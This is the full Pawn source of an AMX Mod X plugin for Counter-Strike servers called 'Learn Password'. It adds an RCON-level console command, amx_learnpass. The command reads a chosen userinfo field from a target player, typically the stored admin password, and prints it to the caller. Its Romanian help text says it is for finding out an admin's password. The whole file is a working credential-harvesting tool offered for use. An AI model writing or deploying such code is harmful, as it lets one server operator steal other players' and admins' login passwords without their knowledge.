#include < amxmodx >
#include < amxmisc >

#pragma semicolon 1


static const
	
	PLUGIN[ ] =	"Learn Password",
	VERSION[ ] =	"1.0",
	AUTHOR[ ] =	"Rap^^";


public plugin_init( )
{
	register_plugin( PLUGIN, VERSION, AUTHOR );
	register_cvar( PLUGIN, AUTHOR, FCVAR_SERVER );
	
	register_concmd( "amx_learnpass", "ConCmdLearnPassword", ADMIN_RCON, "Afla parola de la admin" );
}

public ConCmdLearnPassword( id )
{	
	new szVictim[ 32 ];
	new szField[ 32 ];
	
	read_argv( 1, szVictim, charsmax( szVictim ) );
	read_argv( 2, szField, charsmax( szField ) );
	
	new player = cmd_target( id, szVictim, 8 );
	
	if( !player )
	{	
		return PLUGIN_HANDLED;
	}
	
	new szPassword[ 32 ];
	
	get_user_info( player, szField, szPassword, charsmax( szPassword ) );
	
	console_print( id, "PAROLA ESTE: %s", szPassword );
	
	return PLUGIN_HANDLED;
}
